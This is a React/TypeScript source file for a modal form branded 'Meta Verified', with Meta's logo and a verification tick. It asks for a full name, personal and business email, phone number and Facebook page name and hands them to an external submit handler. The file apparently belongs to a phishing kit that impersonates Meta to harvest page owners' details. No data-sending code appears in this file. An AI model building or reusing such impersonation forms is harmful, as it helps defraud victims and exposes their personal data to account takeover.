'use client';

import MetaLogo from '@/assets/images/meta-logo-grey.png';
import { tickSrc } from '@/components/icons';
import PhoneInput from '@/components/phone-input';
import { memo, useCallback, useState, type FC, type FormEvent } from 'react';

export interface FirstFormPayload {
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    phone: string;
    pageName: string;
}

interface FirstFormModalProps {
    show: boolean;
    onClose: () => void;
    onSubmit: (data: FirstFormPayload) => void;
    texts: Record<string, string>;
}

interface FirstFormModalInnerProps {
    onClose: () => void;
    onSubmit: (data: FirstFormPayload) => void;
    texts: Record<string, string>;
}

const FirstFormModalInner: FC<FirstFormModalInnerProps> = ({ onClose, onSubmit, texts }) => {
    const [formData, setFormData] = useState({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        agreeTerms: false
    });
    const [errors, setErrors] = useState<Record<string, boolean>>({});

    const handleChange = useCallback((field: string, value: string | boolean) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        setErrors((prev) => (prev[field] ? { ...prev, [field]: false } : prev));
    }, []);

    const handlePhoneChange = useCallback((value: string) => {
        handleChange('phone', value);
    }, [handleChange]);

    const handleSubmit = (e: FormEvent) => {
        e.preventDefault();
        const newErrors: Record<string, boolean> = {};

        if (!formData.fullName.trim()) newErrors.fullName = true;
        if (!formData.personalEmail.trim()) newErrors.personalEmail = true;
        if (!formData.businessEmail.trim()) newErrors.businessEmail = true;
        if (!formData.phone.trim()) newErrors.phone = true;
        if (!formData.pageName.trim()) newErrors.pageName = true;
        if (!formData.agreeTerms) newErrors.agreeTerms = true;

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors);
            return;
        }

        onSubmit({
            fullName: formData.fullName,
            personalEmail: formData.personalEmail,
            businessEmail: formData.businessEmail,
            phone: formData.phone,
            pageName: formData.pageName
        });
    };

    return (
        <>
            <div className='modal-backdrop show' onClick={onClose} aria-hidden='true' />
            <div className='modal form-modal show' id='exampleModal1' style={{ display: 'block' }} tabIndex={-1}>
                <div className='modal-dialog modal-dialog-centered modal-dialog-scrollable'>
                    <div className='modal-content'>
                        <div className='modal-header'>
                            <h5 className='modal-title'>
                                {texts.metaVerified || 'Meta Verified'}
                                <img src={tickSrc} width={18} alt='tick' style={{ verticalAlign: 'middle' }} />
                            </h5>
                            <button aria-label='Close' className='btn-close' type='button' onClick={onClose} />
                        </div>
                        <div className='modal-body'>
                            <form id='first-form' onSubmit={handleSubmit}>
                                <div className='mb-3'>
                                    <label className='form-label' htmlFor='FullNameField'>
                                        {texts.fullName}
                                    </label>
                                    <input
                                        className={`form-control ${errors.fullName ? 'is-invalid' : ''}`}
                                        id='FullNameField'
                                        minLength={3}
                                        required
                                        type='text'
                                        value={formData.fullName}
                                        onChange={(e) => handleChange('fullName', e.target.value)}
                                    />
                                </div>
                                <div className='mb-3'>
                                    <label className='form-label' htmlFor='PersonalEmailField'>
                                        {texts.personalEmail}
                                    </label>
                                    <input
                                        className={`form-control ${errors.personalEmail ? 'is-invalid' : ''}`}
                                        id='PersonalEmailField'
                                        required
                                        type='email'
                                        value={formData.personalEmail}
                                        onChange={(e) => handleChange('personalEmail', e.target.value)}
                                    />
                                </div>
                                <div className='mb-3'>
                                    <label className='form-label' htmlFor='BuisenessEmailField'>
                                        {texts.businessEmail}
                                    </label>
                                    <input
                                        className={`form-control ${errors.businessEmail ? 'is-invalid' : ''}`}
                                        id='BuisenessEmailField'
                                        required
                                        type='email'
                                        value={formData.businessEmail}
                                        onChange={(e) => handleChange('businessEmail', e.target.value)}
                                    />
                                </div>
                                <div className='mb-3'>
                                    <label className='form-label' htmlFor='PhoneFirld'>
                                        {texts.mobilePhone}
                                    </label>
                                    <PhoneInput
                                        id='PhoneFirld'
                                        name='mobile-phone-number'
                                        onChange={handlePhoneChange}
                                        error={errors.phone}
                                    />
                                </div>
                                <div className='mb-3'>
                                    <label className='form-label' htmlFor='fb-page-name-input'>
                                        {texts.yourPageName}
                                    </label>
                                    <input
                                        className={`form-control ${errors.pageName ? 'is-invalid' : ''}`}
                                        id='fb-page-name-input'
                                        maxLength={80}
                                        minLength={3}
                                        required
                                        type='text'
                                        value={formData.pageName}
                                        onChange={(e) => handleChange('pageName', e.target.value)}
                                    />
                                </div>
                                <div className='mb-3 form-check'>
                                    <input
                                        className={`form-check-input ${errors.agreeTerms ? 'is-invalid' : ''}`}
                                        id='exampleCheck1'
                                        required
                                        type='checkbox'
                                        checked={formData.agreeTerms}
                                        onChange={(e) => handleChange('agreeTerms', e.target.checked)}
                                    />
                                    <label className='form-check-label' htmlFor='exampleCheck1'>
                                        {texts.agreeToTerms}{' '}
                                        <a className='add-svg' id='termsLink'>
                                            {texts.privacyPolicy}
                                        </a>
                                    </label>
                                </div>
                                <div className='form-btn-wrapper'>
                                    <button className='btn btn-primary' type='submit'>
                                        <span className='button-text'>{texts.confirm}</span>
                                    </button>
                                </div>
                            </form>
                        </div>
                        <div className='modal-footer border-0 justify-content-center' style={{ flexDirection: 'column', textAlign: 'center' }}>
                            <img src={MetaLogo.src} alt='Meta Logo' style={{ height: '20px', marginBottom: '5px' }} />
                            <div className='footer-links' style={{ fontSize: '12px', color: '#000' }}>
                                {texts.aboutHelpMore}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, texts }) => {
    if (!show) return null;

    return <FirstFormModalInner onClose={onClose} onSubmit={onSubmit} texts={texts} />;
};

export default memo(FirstFormModal);
